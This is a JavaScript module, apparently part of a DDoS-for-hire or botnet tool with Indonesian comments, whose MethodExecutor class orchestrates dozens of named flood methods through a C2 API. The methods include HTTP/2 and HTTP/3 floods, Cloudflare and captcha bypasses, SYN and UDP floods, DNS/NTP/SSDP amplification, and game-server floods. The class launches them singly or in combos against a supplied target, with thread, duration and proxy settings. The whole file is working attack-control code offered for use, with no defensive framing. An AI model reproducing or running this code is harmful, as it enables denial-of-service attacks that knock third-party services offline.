import { LAYER4_METHODS } from '../methods/layer4/index.js';
import { LAYER7_METHODS } from '../methods/layer7/index.js';
import * as Layer4 from '../methods/layer4/index.js';
import * as Layer7 from '../methods/layer7/index.js';
import { logger } from '../utils/logger.js';

/**
 * Method Executor - Execute semua 36+ attack methods via C2 API
 */
export class MethodExecutor {
    constructor() {
        this.activeAttacks = new Map();
        this.methodMap = this.buildMethodMap();
    }

    /**
     * Build mapping dari method name ke class
     */
    buildMethodMap() {
        const map = new Map();

        // Layer 7 Methods
        map.set('GET', Layer7.HTTPGetFlood);
        map.set('POST', Layer7.HTTPPostFlood);
        map.set('HEAD', Layer7.HTTPGetFlood); // Use GET with HEAD
        map.set('SLOW', Layer7.HTTPSlowAttack);
        map.set('HTTP2', Layer7.HTTP2Flood);
        map.set('HTTP2-POST', Layer7.HTTP2PostFlood);
        map.set('HTTP2-CF', Layer7.HTTP2CFBypass);
        map.set('HTTP3', Layer7.HTTP3Attack);
        map.set('HTTP3-POST', Layer7.HTTP3PostAttack);
        map.set('CFB', Layer7.CloudflareBypass);
        map.set('CFBUAM', Layer7.CloudflareBypass);
        map.set('BYPASS', Layer7.AdvancedBypass);
        map.set('BOT', Layer7.BotSimulation);
        map.set('PRIVACYPASS', Layer7.PrivacyPassBypass);
        map.set('CAPTCHA', Layer7.CaptchaBypass);
        map.set('ULTIMATE', Layer7.UltimateBypass);
        map.set('XMLRPC', Layer7.XMLRPCAttack);
        map.set('STRESS', Layer7.StressAttack);
        map.set('DYN', Layer7.DynamicAttack);
        map.set('COOKIE', Layer7.CookieAttack);
        map.set('APACHE', Layer7.ApacheRangeAttack);
        map.set('NULL', Layer7.NullAttack);
        map.set('CF-KILLER', Layer7.CloudflareKiller);
        map.set('CF-ADVANCED', Layer7.CloudflareAdvancedBypass);
        map.set('BROWSER-EMU', Layer7.BrowserEmulationAttack);

        // Layer 4 Methods
        map.set('UDP', Layer4.UDPFlood);
        map.set('TCP', Layer4.TCPFlood);
        map.set('MINECRAFT', Layer4.MinecraftFlood);
        map.set('MCBOT', Layer4.MinecraftBot);
        map.set('CPS', Layer4.CPSFlood);
        map.set('CONNECTION', Layer4.ConnectionFlood);
        map.set('SYN', Layer4.SYNFlood);
        map.set('VSE', Layer4.VSEFlood);
        map.set('TS3', Layer4.TS3Flood);
        map.set('MCPE', Layer4.MCPEFlood);
        map.set('FIVEM', Layer4.FiveMFlood);
        map.set('FIVEM-TOKEN', Layer4.FiveMTokenFlood);
        map.set('OVH-UDP', Layer4.OVHUDPFlood);
        map.set('DNS-AMP', Layer4.DNSAmplification);
        map.set('NTP-AMP', Layer4.NTPAmplification);
        map.set('SSDP-AMP', Layer4.SSDPAmplification);

        return map;
    }

    /**
     * Check if method is valid
     */
    isValidMethod(method) {
        return this.methodMap.has(method.toUpperCase());
    }

    /**
     * Get all available methods
     */
    getAllMethods() {
        return {
            layer7: LAYER7_METHODS,
            layer4: LAYER4_METHODS,
            total: LAYER7_METHODS.length + LAYER4_METHODS.length
        };
    }

    /**
     * Execute attack method
     */
    async executeMethod(attackConfig) {
        const {
            attackId,
            target,
            method,
            threads = 100,
            duration = 60,
            rpc = 10,
            proxies = null,
            userAgents = [],
            referers = [],
            onProgress = null,
            onComplete = null,
            onError = null
        } = attackConfig;

        const methodUpper = method.toUpperCase();

        if (!this.isValidMethod(methodUpper)) {
            throw new Error(`Method '${method}' tidak valid! Ketik /methods buat liat yang bener.`);
        }

        const MethodClass = this.methodMap.get(methodUpper);
        
        try {
            logger.info(`🔥 Executing ${methodUpper} attack on ${target}`);
            logger.info(`   Threads: ${threads}, Duration: ${duration}s, RPC: ${rpc}`);

            // Create attack instances - scale with threads but cap to prevent OOM
            const numInstances = Math.min(Math.max(Math.floor(threads / 10), 5), 50); // Min 5, Max 50 instances
            const attacks = [];
            
            logger.info(`   Creating ${numInstances} attack instances (threads: ${threads})`);
            
            // Check which constructor signature to use
            const simpleBypassMethods = ['CFB', 'CFBUAM', 'BYPASS', 'PRIVACYPASS', 'CAPTCHA', 'ULTIMATE'].includes(methodUpper);
            const advancedBypassMethods = ['CF-ADVANCED', 'BROWSER-EMU'].includes(methodUpper);
            
            for (let i = 0; i < numInstances; i++) {
                let attack;
                if (simpleBypassMethods) {
                    // Simple bypass methods: (targetUrl, duration, rpc, proxies)
                    attack = new MethodClass(target, duration, rpc, proxies);
                } else if (advancedBypassMethods) {
                    // Advanced bypass methods: (targetUrl, duration, rpc, userAgents, referers, proxies)
                    attack = new MethodClass(target, duration, rpc, userAgents, referers, proxies);
                } else {
                    // Standard methods: (targetUrl, duration, rpc, userAgents, referers, proxies)
                    attack = new MethodClass(target, duration, rpc, userAgents, referers, proxies);
                }
                attacks.push(attack);
            }
            
            // Store attack
            this.activeAttacks.set(attackId, {
                method: methodUpper,
                attacks,
                startTime: Date.now(),
                config: { target, threads, duration, rpc }
            });

            // Start all attack instances
            logger.info(`   Starting ${numInstances} attack instances...`);
            attacks.forEach(attack => {
                attack.start().catch(err => {
                    logger.error(`Attack instance error: ${err.message}`);
                });
            });

            // Progress monitoring
            if (onProgress) {
                const progressInterval = setInterval(() => {
                    if (!this.activeAttacks.has(attackId)) {
                        clearInterval(progressInterval);
                        return;
                    }

                    const stats = { totalRequests: 0, successfulRequests: 0, failedRequests: 0 };
                    onProgress({
                        attackId,
                        method: methodUpper,
                        stats,
                        elapsed: Math.floor((Date.now() - this.activeAttacks.get(attackId).startTime) / 1000)
                    });
                }, 5000);

                // Clear interval when done
                setTimeout(() => clearInterval(progressInterval), duration * 1000 + 5000);
            }

            // Wait for completion
            setTimeout(async () => {
                const finalStats = { totalRequests: 0, successfulRequests: 0, failedRequests: 0 };
                
                logger.success(`✅ ${methodUpper} attack completed!`);
                logger.info(`   Duration: ${duration}s with ${threads} threads`);

                // Cleanup
                this.activeAttacks.delete(attackId);

                if (onComplete) {
                    onComplete({
                        attackId,
                        method: methodUpper,
                        stats: finalStats,
                        duration
                    });
                }
            }, duration * 1000);

            return {
                success: true,
                attackId,
                method: methodUpper,
                message: `Attack ${methodUpper} launched successfully!`
            };

        } catch (error) {
            logger.error(`❌ Error executing ${methodUpper}:`, error);
            this.activeAttacks.delete(attackId);

            if (onError) {
                onError({
                    attackId,
                    method: methodUpper,
                    error: error.message
                });
            }

            throw error;
        }
    }

    /**
     * Execute combo attack (multiple methods)
     */
    async executeCombo(attackConfig) {
        const {
            attackId,
            target,
            methods = [],
            threads = 100,
            duration = 60,
            rpc = 10,
            proxies = null,
            userAgents = [],
            referers = [],
            onProgress = null,
            onComplete = null
        } = attackConfig;

        if (methods.length === 0) {
            throw new Error('Minimal 1 method harus dipilih untuk combo attack!');
        }

        logger.info(`🔥🔥🔥 Executing COMBO attack: ${methods.join(', ')}`);
        logger.info(`   Target: ${target}`);
        logger.info(`   Total Threads: ${threads}, Duration: ${duration}s`);

        const threadsPerMethod = Math.floor(threads / methods.length);
        const attacks = [];
        const results = [];

        try {
            // Launch all methods simultaneously
            for (const method of methods) {
                const methodAttackId = `${attackId}-${method}`;
                
                const promise = this.executeMethod({
                    attackId: methodAttackId,
                    target,
                    method,
                    threads: threadsPerMethod,
                    duration,
                    rpc,
                    proxies,
                    userAgents,
                    referers,
                    onProgress: (data) => {
                        if (onProgress) {
                            onProgress({
                                ...data,
                                comboAttackId: attackId,
                                totalMethods: methods.length
                            });
                        }
                    }
                });

                attacks.push(promise);
            }

            // Wait for all attacks to complete
            const attackResults = await Promise.allSettled(attacks);

            // Collect results
            attackResults.forEach((result, index) => {
                if (result.status === 'fulfilled') {
                    results.push({
                        method: methods[index],
                        success: true,
                        data: result.value
                    });
                } else {
                    results.push({
                        method: methods[index],
                        success: false,
                        error: result.reason.message
                    });
                }
            });

            logger.success(`✅ COMBO attack completed!`);
            logger.info(`   Methods: ${methods.join(', ')}`);
            logger.info(`   Success: ${results.filter(r => r.success).length}/${methods.length}`);

            if (onComplete) {
                onComplete({
                    attackId,
                    methods,
                    results,
                    duration
                });
            }

            return {
                success: true,
                attackId,
                methods,
                results,
                message: `Combo attack with ${methods.length} methods launched!`
            };

        } catch (error) {
            logger.error(`❌ Combo attack error:`, error);
            throw error;
        }
    }

    /**
     * Stop attack
     */
    stopAttack(attackId) {
        const attackData = this.activeAttacks.get(attackId);
        
        if (!attackData) {
            return { success: false, message: 'Attack not found or already stopped' };
        }

        try {
            // Stop all attack instances
            if (attackData.attacks && Array.isArray(attackData.attacks)) {
                attackData.attacks.forEach(attack => {
                    if (attack && typeof attack.stop === 'function') {
                        attack.stop();
                    }
                });
            }

            this.activeAttacks.delete(attackId);
            logger.info(`⚠️  Attack ${attackId} stopped`);

            return {
                success: true,
                message: `Attack ${attackId} stopped successfully`
            };
        } catch (error) {
            logger.error(`Error stopping attack ${attackId}:`, error);
            return {
                success: false,
                message: error.message
            };
        }
    }

    /**
     * Stop all attacks
     */
    stopAllAttacks() {
        let stopped = 0;

        for (const [attackId, attackData] of this.activeAttacks) {
            try {
                // Stop all attack instances
                if (attackData.attacks && Array.isArray(attackData.attacks)) {
                    attackData.attacks.forEach(attack => {
                        if (attack && typeof attack.stop === 'function') {
                            attack.stop();
                        }
                    });
                }
                stopped++;
            } catch (error) {
                logger.error(`Error stopping attack ${attackId}:`, error);
            }
        }

        this.activeAttacks.clear();
        logger.info(`⚠️  Stopped ${stopped} attack(s)`);

        return {
            success: true,
            stopped,
            message: `Stopped ${stopped} attack(s)`
        };
    }

    /**
     * Get active attacks
     */
    getActiveAttacks() {
        const attacks = [];

        for (const [attackId, attackData] of this.activeAttacks) {
            const elapsed = Math.floor((Date.now() - attackData.startTime) / 1000);

            attacks.push({
                attackId,
                method: attackData.method,
                target: attackData.config.target,
                threads: attackData.config.threads,
                duration: attackData.config.duration,
                elapsed
            });
        }

        return attacks;
    }

    /**
     * Get attack stats
     */
    getAttackStats(attackId) {
        const attackData = this.activeAttacks.get(attackId);
        
        if (!attackData) {
            return null;
        }

        const elapsed = Math.floor((Date.now() - attackData.startTime) / 1000);

        return {
            attackId,
            method: attackData.method,
            target: attackData.config.target,
            elapsed,
            stats: {
                totalRequests: 0,
                successfulRequests: 0,
                failedRequests: 0
            }
        };
    }
}

// Export singleton instance
export const methodExecutor = new MethodExecutor();
